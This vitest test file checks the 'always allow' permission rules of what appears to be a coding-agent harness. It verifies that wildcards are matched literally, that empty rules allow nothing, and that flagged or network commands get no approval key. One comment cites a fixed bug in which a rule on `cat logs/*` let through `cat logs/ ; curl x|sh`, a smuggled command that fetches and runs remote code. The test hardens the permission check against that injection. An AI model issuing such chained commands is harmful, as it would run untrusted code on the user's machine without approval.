import { describe, expect, it } from 'vitest'
import { NO_PATH } from '@cc/protocol'
import { AlwaysAllowRules, alwaysAllowKey } from './always-allow.js'

describe('AlwaysAllowRules', () => {
  it('allows nothing while it holds no rules', () => {
    const rules = new AlwaysAllowRules()
    expect(rules.allows('npm test')).toBe(false)
    expect(rules.allows('')).toBe(false)
  })

  it('allows a key equal to a rule without a wildcard, and nothing longer or shorter', () => {
    const rules = new AlwaysAllowRules()
    rules.add('npm test')
    expect(rules.allows('npm test')).toBe(true)
    expect(rules.allows('npm test --watch')).toBe(false)
    expect(rules.allows('npm tes')).toBe(false)
  })

  // A trailing * was a prefix wildcard, and "always" on `cat logs/*` then allowed `cat logs/ ; curl x|sh` (#838)
  it('treats a trailing * as a literal character, not a prefix', () => {
    const rules = new AlwaysAllowRules()
    rules.add('npm test*')
    expect(rules.allows('npm test')).toBe(false)
    expect(rules.allows('npm test --watch')).toBe(false)
    expect(rules.allows('npm test*')).toBe(true)
  })

  it('treats a * anywhere but the end as a literal character', () => {
    const rules = new AlwaysAllowRules()
    rules.add('npm * test')
    expect(rules.allows('npm run test')).toBe(false)
    expect(rules.allows('npm * test')).toBe(true)
  })

  // An empty matcher is no rule: it must never match every key (mutation A3)
  it('allows nothing because of an empty rule', () => {
    const rules = new AlwaysAllowRules()
    rules.add('')
    expect(rules.allows('x')).toBe(false)
    expect(rules.allows('npm test')).toBe(false)
  })

  it('allows a key matching any one of the rules added with addAll', () => {
    const rules = new AlwaysAllowRules()
    rules.addAll(['git status', '/repo/src/a.ts'])
    expect(rules.allows('git status')).toBe(true)
    expect(rules.allows('/repo/src/a.ts')).toBe(true)
    expect(rules.allows('/repo/docs/a.md')).toBe(false)
  })
})

describe('alwaysAllowKey', () => {
  it('keys a command by its full text and a file edit by its path', () => {
    expect(alwaysAllowKey({ kind: 'command', command: 'npm test', cwd: '/repo' })).toBe('npm test')
    expect(alwaysAllowKey({ kind: 'file_edit', path: '/repo/a.ts', diffPreview: '', multi: false })).toBe('/repo/a.ts')
  })

  it('gives other kinds no key', () => {
    expect(alwaysAllowKey({ kind: 'other', raw: '{}' })).toBe('')
  })

  it('gives no key to a file edit whose path is blank', () => {
    expect(alwaysAllowKey({ kind: 'file_edit', path: '   ', diffPreview: '', multi: false })).toBe('')
    expect(alwaysAllowKey({ kind: 'file_edit', path: '', diffPreview: '', multi: false })).toBe('')
  })

  it('gives no key to a file edit whose path is unknown', () => {
    expect(alwaysAllowKey({ kind: 'file_edit', path: NO_PATH, diffPreview: '', multi: false })).toBe('')
  })

  it('keys a command by its trimmed text, as the UI suggests the matcher', () => {
    expect(alwaysAllowKey({ kind: 'command', command: ' npm test\n', cwd: '/repo' })).toBe('npm test')
  })

  // A rule is the command's text only: it cannot tell these from the plain command, or survive an older host (#838)
  it('gives no key to a flagged command or one ending in *', () => {
    const c = { kind: 'command' as const, command: 'npm test', cwd: '/repo' }
    expect(alwaysAllowKey({ ...c, unsandboxed: true })).toBe('')
    expect(alwaysAllowKey({ ...c, stdin: true })).toBe('')
    expect(alwaysAllowKey({ ...c, network: { host: 'x', protocol: 'https' } })).toBe('')
    expect(alwaysAllowKey({ ...c, command: 'cat logs/* ' })).toBe('')
  })
})
